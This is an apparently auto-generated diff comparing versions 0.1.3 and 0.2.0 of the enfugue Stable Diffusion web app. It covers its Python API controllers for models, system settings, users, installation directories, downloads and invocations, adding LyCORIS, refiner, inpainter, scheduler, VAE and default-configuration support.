 class EnfugueAPIModelsController(EnfugueAPIControllerBase):
     handlers = UserExtensionHandlerRegistry()
 
+    MODEL_DEFAULT_FIELDS = [
+        "width",
+        "height",
+        "chunking_size",
+        "chunking_blur",
+        "inference_steps",
+        "guidance_scale",
+        "refiner_denoising_strength",
+        "refiner_guidance_scale",
+        "refiner_aesthetic_score",
+        "refiner_negative_aesthetic_score",
+    ]
+
+    DEFAULT_CHECKPOINTS = [
+        os.path.basename(DEFAULT_MODEL),
+        os.path.basename(DEFAULT_INPAINTING_MODEL),
+        os.path.basename(DEFAULT_SDXL_MODEL),
+        os.path.basename(DEFAULT_SDXL_REFINER),
+    ]
+
     @handlers.path("^/api/checkpoints$")
     @handlers.methods("GET")
     @handlers.format()
     @handlers.secured()
     def get_checkpoints(self, request: Request, response: Response) -> List[str]:
         """
         Gets installed checkpoints.
         """
-        checkpoints = []
         checkpoints_dir = self.configuration.get(
             "enfugue.engine.checkpoint", os.path.join(self.engine_root, "checkpoint")
         )
-        if os.path.exists(checkpoints_dir):
-            checkpoints = os.listdir(checkpoints_dir)
+        checkpoints = [
+            os.path.basename(filename)
+            for filename in find_files_in_directory(checkpoints_dir)
+        ]
+        for checkpoint in self.DEFAULT_CHECKPOINTS:
+            if checkpoint not in checkpoints:
+                checkpoints.append(checkpoint)
         return checkpoints
 
     @handlers.path("^/api/lora$")
     @handlers.methods("GET")
     @handlers.format()
     @handlers.secured()
     def get_lora(self, request: Request, response: Response) -> List[str]:
         """
         Gets installed lora.
         """
-        lora = []
-        lora_dir = self.configuration.get(
-            "enfugue.engine.lora", os.path.join(self.engine_root, "lora")
-        )
-        if os.path.exists(lora_dir):
-            lora = os.listdir(lora_dir)
+        lora_dir = self.configuration.get("enfugue.engine.lora", os.path.join(self.engine_root, "lora"))
+        lora = [
+            os.path.basename(filename)
+            for filename in find_files_in_directory(lora_dir)
+        ]
         return lora
 
+    @handlers.path("^/api/lycoris$")
+    @handlers.methods("GET")
+    @handlers.format()
+    @handlers.secured()
+    def get_lycoris(self, request: Request, response: Response) -> List[str]:
+        """
+        Gets installed lycoris/locon
+        """
+        lycoris = []
+        lycoris_dir = self.configuration.get("enfugue.engine.lycoris", os.path.join(self.engine_root, "lycoris"))
+        lycoris = [
+            os.path.basename(filename)
+            for filename in find_files_in_directory(lycoris_dir)
+        ]
+        return lycoris
+
     @handlers.path("^/api/inversions$")
     @handlers.methods("GET")
     @handlers.format()
     @handlers.secured()
     def get_inversions(self, request: Request, response: Response) -> List[str]:
         """
         Gets installed textual inversions.
         """
-        inversions = []
-        inversions_dir = self.configuration.get(
-            "enfugue.engine.inversion", os.path.join(self.engine_root, "inversion")
-        )
-        if os.path.exists(inversions_dir):
-            inversions = os.listdir(inversions_dir)
+        inversions_dir = self.configuration.get("enfugue.engine.inversion", os.path.join(self.engine_root, "inversion"))
+        inversions = [
+            os.path.basename(filename)
+            for filename in find_files_in_directory(inversions_dir)
+        ]
         return inversions
 
     @handlers.path("^/api/tensorrt$")
     @handlers.methods("GET")
     @handlers.format()
     @handlers.secured("DiffusionModel", "read")
     def get_tensorrt_engines(self, request: Request, response: Response) -> List[Dict[str, Any]]:
@@ -92,18 +137,20 @@
             engine_inversion = []
             engine_metadata = {}
             engine_size = 512
 
             if os.path.exists(engine_metadata_path):
                 engine_metadata = load_json(engine_metadata_path)
                 engine_lora = engine_metadata.get("lora", [])
+                engine_lycoris = engine_metadata.get("lycoris", [])
                 engine_inversion = engine_metadata.get("inversion", [])
 
-                engine_lora_dict: Dict[str, float] = dict(
-                    [(str(part[0]), float(part[1])) for part in engine_lora]
+                engine_lora_dict: Dict[str, float] = dict([(str(part[0]), float(part[1])) for part in engine_lora])
+                engine_lycoris_dict: Dict[str, float] = dict(
+                    [(str(part[0]), float(part[1])) for part in engine_lycoris]
                 )
 
                 engine_size = engine_metadata.get("size", engine_size)
                 engine_used = False
                 maybe_name, _, maybe_inpainting = engine_model.rpartition("-")
                 if maybe_inpainting == "inpainting":
                     engine_model_name = maybe_name
@@ -117,55 +164,63 @@
                     .filter(self.orm.DiffusionModel.size == engine_size)
                     .all()
                 )
 
                 for model in possible_models:
                     mismatched = False
                     matched_lora = []
+                    matched_lycoris = []
                     matched_inversion = []
                     for lora in model.lora:
                         lora_name, ext = os.path.splitext(lora.model)
                         if engine_lora_dict.get(lora_name, None) != lora.weight:
                             mismatched = True
                             continue
                         else:
                             matched_lora.append(lora_name)
+                    for lycoris in model.lycoris:
+                        lycoris_name, ext = os.path.splitext(lycoris.model)
+                        if engine_lycoris_dict.get(lycoris_name, None) != lycoris.weight:
+                            mismatched = True
+                            continue
+                        else:
+                            matched_lycoris.append(lycoris_name)
                     for inversion in model.inversion:
                         inversion_name, ext = os.path.splitext(inversion.model)
                         if inversion_name not in engine_inversion:
                             mismatched = True
                             continue
                         else:
                             matched_inversion.append(inversion_name)
                     if (
                         len(matched_lora) == len(engine_lora_dict.keys())
+                        and len(matched_lycoris) == len(engine_lycoris_dict.keys())
                         and len(matched_inversion) == len(engine_inversion)
                         and not mismatched
                     ):
                         engine_used_by.append(model.name)
                         engine_used = True
 
             engines.append(
                 {
                     "key": engine_key,
                     "type": engine_type,
                     "model": engine_model,
                     "lora": engine_lora,
+                    "lycoris": engine_lycoris,
                     "inversion": engine_inversion,
                     "used": engine_used,
                     "used_by": list(set(engine_used_by)),
                     "size": engine_size,
                     "bytes": os.path.getsize(engine),
                 }
             )
         return engines
 
-    @handlers.path(
-        "^/api/tensorrt/(?P<model_name>[^\/]+)/(?P<engine_type>[a-z]+)/(?P<engine_key>[a-zA-Z0-9]+)$"
-    )
+    @handlers.path("^/api/tensorrt/(?P<model_name>[^\/]+)/(?P<engine_type>[a-z]+)/(?P<engine_key>[a-zA-Z0-9]+)$")
     @handlers.methods("DELETE")
     @handlers.format()
     @handlers.secured("DiffusionModel", "update")
     def delete_tensorrt_engine(
         self,
         request: Request,
         response: Response,
@@ -174,61 +229,94 @@
         engine_key: str,
     ) -> None:
         """
         Removes an individual tensorrt engine.
         """
         engine_dir = os.path.join(self.engine_root, "tensorrt", model_name, engine_type, engine_key)
         if not os.path.exists(engine_dir):
-            raise NotFoundError(
-                f"Couldn't find {engine_type} TensorRT engine for {model_name} with key {engine_key}"
-            )
+            raise NotFoundError(f"Couldn't find {engine_type} TensorRT engine for {model_name} with key {engine_key}")
         shutil.rmtree(engine_dir)
 
-    @handlers.path("^/api/models/(?P<model_name>[^\/]+)/tensorrt$")
+    @handlers.path("^/api/models/(?P<model_name>[^\/]+)/status$")
     @handlers.methods("GET")
     @handlers.format()
     @handlers.secured("DiffusionModel", "read")
-    def get_model_tensorrt_status(
-        self, request: Request, response: Response, model_name: str
-    ) -> Dict[str, Any]:
+    def get_model_status(self, request: Request, response: Response, model_name: str) -> Dict[str, Any]:
         """
-        Gets TensorRT status for a particular model
+        Gets status for a particular model
         """
         model = (
             self.database.query(self.orm.DiffusionModel)
             .filter(self.orm.DiffusionModel.name == model_name)
             .one_or_none()
         )
         if not model:
             raise NotFoundError(f"No model named {model_name}")
 
-        return DiffusionPipelineManager.get_tensorrt_status(
+        main_model_status = DiffusionPipelineManager.get_status(
             self.engine_root,
             model.model,
             model.size,
             [(lora.model, lora.weight) for lora in model.lora],
+            [(lycoris.model, lycoris.weight) for lycoris in model.lycoris],
             [inversion.model for inversion in model.inversion],
         )
 
+        if model.inpainter:
+            inpainter_model = model.inpainter[0].model
+            inpainter_model_status = DiffusionPipelineManager.get_status(
+                self.engine_root,
+                model.inpainter[0].model,
+                model.size,
+            )
+        else:
+            model_name, ext = os.path.splitext(model.model)
+            inpainter_model = f"{model_name}-inpainting{ext}"
+            inpainter_model_status = DiffusionPipelineManager.get_status(
+                self.engine_root,
+                inpainter_model,
+                model.size,
+            )
+
+        if model.refiner:
+            refiner_model = model.refiner[0].model
+            refiner_model_status = DiffusionPipelineManager.get_status(
+                self.engine_root,
+                refiner_model,
+                model.size,
+            )
+        else:
+            refiner_model = None
+            refiner_model_status = None
+
+        return {
+            "model": model.model,
+            "refiner": refiner_model,
+            "inpainter": inpainter_model,
+            "tensorrt": {
+                "base": main_model_status,
+                "inpainter": inpainter_model_status,
+                "refiner": refiner_model_status,
+            },
+        }
+
     @handlers.path("^/api/models/(?P<model_name>[^\/]+)/tensorrt/(?P<network_name>[^\/]+)$")
     @handlers.methods("POST")
     @handlers.format()
     @handlers.secured("DiffusionModel", "update")
     def create_model_tensorrt_engine(
         self, request: Request, response: Response, model_name: str, network_name: str
     ) -> Dict[str, Any]:
         """
         Issues a job to create an engine.
         """
         plan = DiffusionPlan(**self.get_plan_kwargs_from_model(model_name, include_prompts=False))
         plan.build_tensorrt = True
 
-        step = DiffusionStep(
-            prompt="a green field, blue sky, outside", width=plan.size, height=plan.size
-        )
+        step = DiffusionStep(prompt="a green field, blue sky, outside", width=plan.size, height=plan.size)
         network_name = network_name.lower()
 
         if network_name == "inpaint_unet":
             step.image = PIL.Image.new("RGB", (plan.size, plan.size))
             step.mask = PIL.Image.new("RGB", (plan.size, plan.size))
         elif network_name == "controlled_unet":
             step.control_image = PIL.Image.new("RGB", (plan.size, plan.size))
@@ -240,15 +328,14 @@
         plan.nodes = [DiffusionNode([(0, 0), (plan.size, plan.size)], step)]
         plan.image_callback_steps = None  # Disable decoding
         return self.invoke(
             request.token.user.id,
             plan,
             save=False,
             disable_intermediate_decoding=True,
-            communication_timeout=3600,
             metadata={"tensorrt_build": build_metadata},
         ).format()
 
     @handlers.path("^/api/models/(?P<model_name>[^\/]+)$")
     @handlers.methods("PUT")
     @handlers.format()
     @handlers.secured("DiffusionModel", "update")
@@ -270,32 +357,106 @@
         model.size = request.parsed.get("size", model.size)
         model.prompt = request.parsed.get("prompt", model.prompt)
         model.negative_prompt = request.parsed.get("negative_prompt", model.negative_prompt)
 
         for existing_lora in model.lora:
             self.database.delete(existing_lora)
 
+        for existing_lycoris in model.lycoris:
+            self.database.delete(existing_lycoris)
+
         for existing_inversion in model.inversion:
             self.database.delete(existing_inversion)
 
+        for existing_scheduler in model.scheduler:
+            self.database.delete(existing_scheduler)
+
+        for existing_refiner in model.refiner:
+            self.database.delete(existing_refiner)
+
+        for existing_inpainter in model.inpainter:
+            self.database.delete(existing_inpainter)
+
+        for existing_config in model.config:
+            self.database.delete(existing_config)
+
+        for existing_vae in model.vae:
+            self.database.delete(existing_vae)
+
         self.database.commit()
 
+        refiner = request.parsed.get("refiner", None)
+        if refiner:
+            self.database.add(
+                self.orm.DiffusionModelRefiner(
+                    diffusion_model_name=model_name, model=refiner, size=request.parsed.get("refiner_size", None)
+                )
+            )
+
+        inpainter = request.parsed.get("inpainter", None)
+        if inpainter:
+            self.database.add(
+                self.orm.DiffusionModelInpainter(
+                    diffusion_model_name=model_name, model=inpainter, size=request.parsed.get("inpainter_size", None)
+                )
+            )
+
+        scheduler = request.parsed.get("scheduler", None)
+        if scheduler:
+            self.database.add(
+                self.orm.DiffusionModelScheduler(
+                    diffusion_model_name=model_name,
+                    name=scheduler,
+                )
+            )
+
+        multi_scheduler = request.parsed.get("multi_scheduler", None)
+        if multi_scheduler:
+            self.database.add(
+                self.orm.DiffusionModelScheduler(
+                    diffusion_model_name=model_name, name=multi_scheduler, context="multi_diffusion"
+                )
+            )
+
+        vae = request.parsed.get("vae", None)
+        if vae:
+            self.database.add(
+                self.orm.DiffusionModelVAE(
+                    diffusion_model_name=model_name,
+                    name=vae,
+                )
+            )
+
         for lora in request.parsed.get("lora", []):
             new_lora = self.orm.DiffusionModelLora(
                 diffusion_model_name=model.name, model=lora["model"], weight=lora["weight"]
             )
             self.database.add(new_lora)
 
+        for lycoris in request.parsed.get("lycoris", []):
+            new_lycoris = self.orm.DiffusionModelLycoris(
+                diffusion_model_name=model.name, model=lycoris["model"], weight=lycoris["weight"]
+            )
+            self.database.add(new_lycoris)
+
         for inversion in request.parsed.get("inversion", []):
             new_inversion = self.orm.DiffusionModelInversion(
                 diffusion_model_name=model.name,
                 model=inversion,
             )
             self.database.add(new_inversion)
 
+        for field_name in self.MODEL_DEFAULT_FIELDS:
+            field_value = request.parsed.get(field_name, None)
+            if field_value:
+                new_config = self.orm.DiffusionModelDefaultConfiguration(
+                    diffusion_model_name=model.name, configuration_key=field_name, configuration_value=field_value
+                )
+                self.database.add(new_config)
+
         self.database.commit()
         return model
 
     @handlers.path("^/api/models/(?P<model_name>.+)$")
     @handlers.methods("DELETE")
     @handlers.secured("DiffusionModel", "delete")
     def delete_model(self, request: Request, response: Response, model_name: str) -> None:
@@ -308,16 +469,26 @@
             .one_or_none()
         )
         if not model:
             raise NotFoundError(f"No model named {model_name}")
 
         for lora in model.lora:
             self.database.delete(lora)
+        for lycoris in model.lycoris:
+            self.database.delete(lycoris)
         for inversion in model.inversion:
             self.database.delete(inversion)
+        for refiner in model.refiner:
+            self.database.delete(refiner)
+        for scheduler in model.scheduler:
+            self.database.delete(scheduler)
+        for vae in model.vae:
+            self.database.delete(vae)
+        for config in model.config:
+            self.database.delete(config)
 
         self.database.commit()
         self.database.delete(model)
         self.database.commit()
 
     @handlers.path("^/api/models$")
     @handlers.methods("POST")
@@ -333,26 +504,73 @@
                 model=request.parsed["checkpoint"],
                 size=request.parsed.get("size", 512),
                 prompt=request.parsed.get("prompt", ""),
                 negative_prompt=request.parsed.get("negative_prompt", ""),
             )
             self.database.add(new_model)
             self.database.commit()
+            refiner = request.parsed.get("refiner", None)
+            if refiner:
+                new_refiner = self.orm.DiffusionModelRefiner(
+                    diffusion_model_name=new_model.name, model=refiner, size=request.parsed.get("refiner_size", None)
+                )
+                self.database.add(new_refiner)
+                self.database.commit()
+            inpainter = request.parsed.get("inpainter", None)
+            if inpainter:
+                new_inpainter = self.orm.DiffusionModelInpainter(
+                    diffusion_model_name=new_model.name,
+                    model=inpainter,
+                    size=request.parsed.get("inpainter_size", None),
+                )
+                self.database.add(new_inpainter)
+                self.database.commit()
+            scheduler = request.parsed.get("scheduler", None)
+            if scheduler:
+                new_scheduler = self.orm.DiffusionModelScheduler(diffusion_model_name=new_model.name, name=scheduler)
+                self.database.add(new_scheduler)
+                self.database.commit()
+            multi_scheduler = request.parsed.get("multi_scheduler", None)
+            if multi_scheduler:
+                new_multi_scheduler = self.orm.DiffusionModelScheduler(
+                    diffusion_model_name=new_model.name, name=multi_scheduler, context="multi_diffusion"
+                )
+                self.database.add(new_multi_scheduler)
+                self.database.commit()
+            vae = request.parsed.get("vae", None)
+            if vae:
+                new_vae = self.orm.DiffusionModelVAE(diffusion_model_name=new_model.name, name=vae)
+                self.database.add(new_vae)
+                self.database.commit()
             for lora in request.parsed.get("lora", []):
                 new_lora = self.orm.DiffusionModelLora(
                     diffusion_model_name=new_model.name, model=lora["model"], weight=lora["weight"]
                 )
                 self.database.add(new_lora)
                 self.database.commit()
-            for inversion in request.parsed.get("inversion", []):
-                new_inversion = self.orm.DiffusionModelInversion(
-                    diffusion_model_name=new_model.name, model=inversion
+            for lycoris in request.parsed.get("lycoris", []):
+                new_lycoris = self.orm.DiffusionModelLycoris(
+                    diffusion_model_name=new_model.name, model=lycoris["model"], weight=lycoris["weight"]
                 )
+                self.database.add(new_lycoris)
+                self.database.commit()
+            for inversion in request.parsed.get("inversion", []):
+                new_inversion = self.orm.DiffusionModelInversion(diffusion_model_name=new_model.name, model=inversion)
                 self.database.add(new_inversion)
                 self.database.commit()
+            for field_name in self.MODEL_DEFAULT_FIELDS:
+                field_value = request.parsed.get(field_name, None)
+                if field_value:
+                    new_config = self.orm.DiffusionModelDefaultConfiguration(
+                        diffusion_model_name=new_model.name,
+                        configuration_key=field_name,
+                        configuration_value=field_value,
+                    )
+                    self.database.add(new_config)
+                    self.database.commit()
             return new_model
         except KeyError as ex:
             raise BadRequestError(f"Missing required parameter {ex}")
 
     @handlers.path("^/api/model-options$")
     @handlers.methods("GET")
     @handlers.format()
@@ -364,13 +582,27 @@
         checkpoints_dir = self.configuration.get(
             "enfugue.engine.checkpoint", os.path.join(self.engine_root, "checkpoint")
         )
         if not os.path.exists(checkpoints_dir):
             checkpoints = []
         else:
             checkpoints = os.listdir(checkpoints_dir)
+        
+        checkpoints_dir = self.configuration.get(
+            "enfugue.engine.checkpoint", os.path.join(self.engine_root, "checkpoint")
+        )
+        checkpoints  = list(find_files_in_directory(checkpoints_dir))
         checkpoints.sort(key=lambda item: os.path.getmtime(os.path.join(checkpoints_dir, item)))
+        checkpoints = [
+            os.path.basename(checkpoint)
+            for checkpoint in checkpoints
+        ]
+        for checkpoint in self.DEFAULT_CHECKPOINTS:
+            if checkpoint not in checkpoints:
+                checkpoints.append(checkpoint)
+        
         model_names = self.database.query(self.orm.DiffusionModel.name).all()
-
-        return [{"type": "checkpoint", "name": checkpoint} for checkpoint in checkpoints] + [
+        return [
+            {"type": "checkpoint", "name": checkpoint} for checkpoint in checkpoints
+        ] + [
             {"type": "model", "name": model[0]} for model in model_names
         ]
```

### Comparing `enfugue-0.1.3/enfugue/api/controller/system.py` & `enfugue-0.2.0/enfugue/api/controller/system.py`

 * *Files 4% similar despite different names*

```diff
@@ -72,14 +72,17 @@
         """
         return {
             "safe": self.configuration.get("enfugue.safe", True),
             "auth": not (self.configuration.get("enfugue.noauth", True)),
             "max_queued_invocations": self.manager.max_queued_invocations,
             "max_queued_downloads": self.manager.max_queued_downloads,
             "max_concurrent_downloads": self.manager.max_concurrent_downloads,
+            "switch_mode": self.configuration.get("enfugue.pipeline.switch", "offload"),
+            "cache_mode": self.configuration.get("enfugue.pipeline.cache", "xl"),
+            "precision": self.configuration.get("enfugue.dtype", None),
         }
 
     @handlers.path("^/api/settings$")
     @handlers.methods("POST")
     @handlers.format()
     @handlers.secured("System", "update")
     def update_settings(self, request: Request, response: Response) -> None:
@@ -87,24 +90,38 @@
         Updates the settings that can be manipulated from the UI
         """
         if "auth" in request.parsed:
             self.user_config["enfugue.noauth"] = not request.parsed["auth"]
             if self.user_config["enfugue.noauth"] != request.parsed["auth"]:
                 self.database.execute(delete(self.orm.AuthenticationToken))  # Clear auth data
                 if request.parsed["auth"]:
-                    self.database.execute(
-                        delete(self.orm.User).filter(self.orm.User.username == "noauth")
-                    )
+                    self.database.execute(delete(self.orm.User).filter(self.orm.User.username == "noauth"))
                 self.database.commit()
         if "safe" in request.parsed:
-            if request.parsed["safe"] != self.configuration.get("enfugue.safe", True):
-                # Destroy process so we re-initialize with new safety settings
-                self.manager.stop_engine()
+            self.user_config["enfugue.safe"] = request.parsed["safe"]
+            self.manager.stop_engine()
+        if "switch_mode" in request.parsed:
+            if not request.parsed["switch_mode"]:
+                self.user_config["enfugue.pipeline.switch"] = None
+            else:
+                self.user_config["enfugue.pipeline.switch"] = request.parsed["switch_mode"]
+            self.manager.stop_engine()
+        if "cache_mode" in request.parsed:
+            if not request.parsed["cache_mode"]:
+                self.user_config["enfugue.pipeline.cache"] = None
+            else:
+                self.user_config["enfugue.pipeline.cache"] = request.parsed["cache_mode"]
+            self.manager.stop_engine()
+        if "precision" in request.parsed:
+            if not request.parsed["precision"]:
+                self.user_config["enfugue.dtype"] = None
+            else:
+                self.user_config["enfugue.dtype"] = request.parsed["precision"]
+            self.manager.stop_engine()
         for key in [
-            "safe",
             "max_queued_invocation",
             "max_queued_downloads",
             "max_concurrent_downloads",
         ]:
             if key in request.parsed:
                 self.user_config[f"enfugue.{key}"] = request.parsed[key]
         self.configuration.update(**self.user_config.dict())
@@ -116,19 +133,15 @@
     def create_user(self, request: Request, response: Response) -> User:
         """
         Creates a user.
         """
         username = request.parsed.get("username", None)
         if not username:
             raise BadRequestError("Username is required.")
-        user = (
-            self.database.query(self.orm.User)
-            .filter(self.orm.User.username == username)
-            .one_or_none()
-        )
+        user = self.database.query(self.orm.User).filter(self.orm.User.username == username).one_or_none()
         if user:
             raise BadRequestError(f"User {username} already exists.")
         password = request.parsed.get("new_password", None)
         repeat_password = request.parsed.get("repeat_password", None)
 
         if not password or not repeat_password:
             raise BadRequestError("Password is required.")
@@ -151,33 +164,27 @@
                 .filter(self.orm.PermissionGroup.label == "admin")
                 .one_or_none()
             )
             if not admin_permission_group:
                 raise ConfigurationError(
                     "Couldn't find admin permission group. Did you modify the user initialization configuration?"
                 )
-            self.database.add(
-                self.orm.UserPermissionGroup(user_id=user.id, group_id=admin_permission_group.id)
-            )
+            self.database.add(self.orm.UserPermissionGroup(user_id=user.id, group_id=admin_permission_group.id))
         self.database.commit()
         return user
 
     @handlers.path("^/api/users/(?P<username>[a-zA-Z0-9_]+)$")
     @handlers.methods("PATCH")
     @handlers.format()
     @handlers.secured("User", "update")
     def update_user(self, request: Request, response: Response, username: str) -> User:
         """
         Updates one user.
         """
-        user = (
-            self.database.query(self.orm.User)
-            .filter(self.orm.User.username == username)
-            .one_or_none()
-        )
+        user = self.database.query(self.orm.User).filter(self.orm.User.username == username).one_or_none()
         if not user:
             raise NotFoundError(f"No user named {username}")
 
         if "first_name" in request.parsed:
             user.first_name = request.parsed["first_name"]
         if "last_name" in request.parsed:
             user.last_name = request.parsed["last_name"]
@@ -203,38 +210,30 @@
                 if user_permission_group.group_id == admin_permission_group.id:
                     admin_permission = user_permission_group
                     break
 
             if admin_permission is not None and not request.parsed["admin"]:
                 self.database.delete(admin_permission)
             elif admin_permission is None and request.parsed["admin"]:
-                self.database.add(
-                    self.orm.UserPermissionGroup(
-                        user_id=user.id, group_id=admin_permission_group.id
-                    )
-                )
+                self.database.add(self.orm.UserPermissionGroup(user_id=user.id, group_id=admin_permission_group.id))
         self.database.commit()
         return user
 
     @handlers.path("^/api/users/(?P<username>[a-zA-Z0-9_]+)$")
     @handlers.methods("DELETE")
     @handlers.format()
     @handlers.secured("User", "delete")
     def delete_user(self, request: Request, response: Response, username: str) -> None:
         """
         Deletes one user.
         We have to do the cascading ourselves because of a bug with sqlite and sqlalchemy.
         """
         if username == "enfugue":
             raise BadRequestError("Cannot delete default user.")
-        user = (
-            self.database.query(self.orm.User)
-            .filter(self.orm.User.username == username)
-            .one_or_none()
-        )
+        user = self.database.query(self.orm.User).filter(self.orm.User.username == username).one_or_none()
         if not user:
             raise NotFoundError(f"No user named {username}")
         for permission in user.permissions:
             self.database.delete(permission)
         for permission_group in user.permission_groups:
             self.database.delete(permission_group)
         self.database.commit()
@@ -246,51 +245,48 @@
     @handlers.format()
     @handlers.secured("System", "read")
     def get_installation_summary(self, request: Request, response: Response) -> Dict[str, Any]:
         """
         Gets a summary of files and filesize in the installation
         """
         sizes = {}
-        for dirname in ["cache", "checkpoint", "lora", "inversion", "other"]:
-            directory = self.configuration.get(
-                f"enfugue.engine.{dirname}", os.path.join(self.engine_root, dirname)
-            )
+        for dirname in ["cache", "diffusers", "checkpoint", "lora", "lycoris", "inversion", "tensorrt", "other"]:
+            directory = self.configuration.get(f"enfugue.engine.{dirname}", os.path.join(self.engine_root, dirname))
             items, files, size = get_directory_size(directory)
             sizes[dirname] = {"items": items, "files": files, "bytes": size, "path": directory}
         return sizes
 
     @handlers.path("^/api/installation$")
     @handlers.methods("POST")
     @handlers.format()
     @handlers.secured("System", "update")
     def change_installation_directories(self, request: Request, response: Response) -> None:
         """
         Changes all configured directories.
         """
         for dirname in request.parsed["directories"]:
             path = request.parsed["directories"][dirname]
-            if not os.path.exists(path) and not Path(path).is_relative_to(self.engine_root):
-                # If the user tries to pass a path that is not the default directory but doesn't exist, error
-                raise BadRequestError(f"Unknown directory {path}")
+            if not os.path.exists(path):
+                if Path(path).is_relative_to(self.engine_root):
+                    os.makedirs(path)
+                else:
+                    # If the user tries to pass a path that is not the default directory but doesn't exist, error
+                    raise BadRequestError(f"Unknown directory {path}")
             self.user_config[f"enfugue.engine.{dirname}"] = path  # Save config to database
             self.configuration[f"enfugue.engine.{dirname}"] = path  # Save config to memory
 
     @handlers.path("^/api/installation/(?P<dirname>[a-zA-Z0-9_]+)$")
     @handlers.methods("GET")
     @handlers.format()
     @handlers.secured("System", "read")
-    def get_installation_details(
-        self, request: Request, response: Response, dirname: str
-    ) -> List[Dict[str, Any]]:
+    def get_installation_details(self, request: Request, response: Response, dirname: str) -> List[Dict[str, Any]]:
         """
         Gets a summary of files and filesize in the installation
         """
-        directory = self.configuration.get(
-            f"enfugue.engine.{dirname}", os.path.join(self.engine_root, dirname)
-        )
+        directory = self.configuration.get(f"enfugue.engine.{dirname}", os.path.join(self.engine_root, dirname))
         if not os.path.isdir(directory):
             return []
         items = []
         for item in os.listdir(directory):
             path = os.path.join(directory, item)
             if os.path.isdir(path):
                 sub_items, files, size = get_directory_size(path)
@@ -299,24 +295,19 @@
                 items.append({"type": "file", "name": item, "bytes": os.path.getsize(path)})
         return items
 
     @handlers.path("^/api/installation/(?P<dirname>[^\/]+)/(?P<filename>[^\/]+)$")
     @handlers.methods("DELETE")
     @handlers.format()
     @handlers.secured("System", "update")
-    def remove_from_installation(
-        self, request: Request, response: Response, dirname: str, filename: str
-    ) -> None:
+    def remove_from_installation(self, request: Request, response: Response, dirname: str, filename: str) -> None:
         """
         Deletes a file or directory from the installation
         """
-
-        directory = self.configuration.get(
-            f"enfugue.engine.{dirname}", os.path.join(self.engine_root, dirname)
-        )
+        directory = self.configuration.get(f"enfugue.engine.{dirname}", os.path.join(self.engine_root, dirname))
         path = os.path.join(directory, filename)
         if not os.path.exists(path):
             raise BadRequestError(f"Unknown engine file/directory {dirname}/{filename}")
         if os.path.isdir(path):
             shutil.rmtree(path)
         else:
             os.remove(path)
@@ -326,43 +317,41 @@
     @handlers.methods("POST")
     @handlers.format()
     @handlers.secured("System", "update")
     def add_to_installation(self, request: Request, response: Response, dirname: str) -> None:
         """
         Uploads a file to an installation directory.
         """
-
         if "file" not in request.POST:
             raise BadRequestError("File is missing.")
 
         filename = request.POST["file"].filename
-        directory = self.configuration.get(
-            f"enfugue.engine.{dirname}", os.path.join(self.engine_root, dirname)
-        )
+        directory = self.configuration.get(f"enfugue.engine.{dirname}", os.path.join(self.engine_root, dirname))
         if not os.path.exists(directory):
-            raise BadRequestError(f"Unknonwn directory {dirname}")
+            raise BadRequestError(f"Unknown directory {dirname}")
 
         path = os.path.join(directory, filename)
         with open(path, "wb") as handle:
             for chunk in request.POST["file"].file:
                 handle.write(chunk)
 
     @handlers.path("^/api/installation/(?P<dirname>[a-zA-Z0-9_]+)/move$")
     @handlers.methods("POST")
     @handlers.format()
     @handlers.secured("System", "update")
-    def change_installation_directory(
-        self, request: Request, response: Response, dirname: str
-    ) -> None:
+    def change_installation_directory(self, request: Request, response: Response, dirname: str) -> None:
         """
         Changes the directory of a particular model folder.
         """
         path = os.path.realpath(os.path.abspath(request.parsed["directory"]))
         if not os.path.exists(path):
-            raise BadRequestError(f"Couldn't find directory {path}")
+            if Path(path).is_relative_to(self.engine_root):
+                os.makedirs(path)
+            else:
+                raise BadRequestError(f"Couldn't find directory {path}")
         self.user_config[f"enfugue.engine.{dirname}"] = path  # Save config to database
         self.configuration[f"enfugue.engine.{dirname}"] = path  # Save config to memory
 
     @handlers.path("^/api/logs$")
     @handlers.methods("GET")
     @handlers.format()
     @handlers.secured("System", "read")
@@ -425,17 +414,15 @@
         for line in lines:
             try:
                 parsed_line = LOG_REGEX.match(line)
                 if not parsed_line:
                     raise ValueError("Unknown log format.")
 
                 parsed_dict = parsed_line.groupdict()
-                timestamp = datetime.datetime.strptime(
-                    parsed_dict["timestamp"], "%Y-%m-%d %H:%M:%S,%f"
-                )
+                timestamp = datetime.datetime.strptime(parsed_dict["timestamp"], "%Y-%m-%d %H:%M:%S,%f")
 
                 logs.append(
                     cast(
                         LogDict,
                         {
                             "timestamp": timestamp,
                             "logger": parsed_dict["logger"],
```

### Comparing `enfugue-0.1.3/enfugue/api/downloads.py` & `enfugue-0.2.0/enfugue/api/downloads.py`

 * *Files 2% similar despite different names*

```diff
@@ -83,17 +83,15 @@
         self.create_time = datetime.datetime.now()
         self.progress_queue = None if not progress else MakeQueue()
         self.start_time = None
         self.close_time = None
         self.last_elapsed = None
         self.last_downloaded_bytes = None
         self.last_total_bytes = None
-        self.process = DownloadProcess(
-            src, dest, chunk_size, headers, parameters, self.progress_queue
-        )
+        self.process = DownloadProcess(src, dest, chunk_size, headers, parameters, self.progress_queue)
 
     def start(self) -> None:
         """
         Starts the process, and sets the start time.
         """
         if self.start_time is not None:
             raise IOError("Process already started.")
@@ -119,17 +117,15 @@
     ) -> Optional[Tuple[Optional[float], Optional[int], Optional[int]]]:
         """
         Checks if there is new progress data from the queue, reads it all, then returns the last.
         """
         if not self.started:
             return None
         if self.progress_queue is None:
-            raise ValueError(
-                "Download was initialized with `progress=False`, no progress report is available."
-            )
+            raise ValueError("Download was initialized with `progress=False`, no progress report is available.")
         if not self.closed:
             last_tuple = None
             try:
                 while True:
                     last_tuple = self.progress_queue.get_nowait()
             except Empty:
                 if not self.process.is_alive():
@@ -244,11 +240,9 @@
         Raises errors if the process failed.
         """
         if not self.started:
             return None
         self.check_raise_exitcode()
         self.get_last_progress()
         if not self.last_elapsed:
-            return (
-                datetime.datetime.now() - cast(datetime.datetime, self.start_time)
-            ).total_seconds()
+            return (datetime.datetime.now() - cast(datetime.datetime, self.start_time)).total_seconds()
         return self.last_elapsed
```

### Comparing `enfugue-0.1.3/enfugue/api/invocations.py` & `enfugue-0.2.0/enfugue/api/invocations.py`

 * *Files 2% similar despite different names*

```diff
@@ -36,15 +36,15 @@
     def __init__(
         self,
         engine: DiffusionEngine,
         plan: DiffusionPlan,
         engine_image_dir: str,
         engine_intermediate_dir: str,
         decode_nth_intermediate: Optional[int] = 10,
-        communication_timeout: Optional[int] = 90,  # Really big images can take this long to start
+        communication_timeout: Optional[int] = 180,
         metadata: Optional[Dict[str, Any]] = None,
         save: bool = True,
         **kwargs: Any,
     ) -> None:
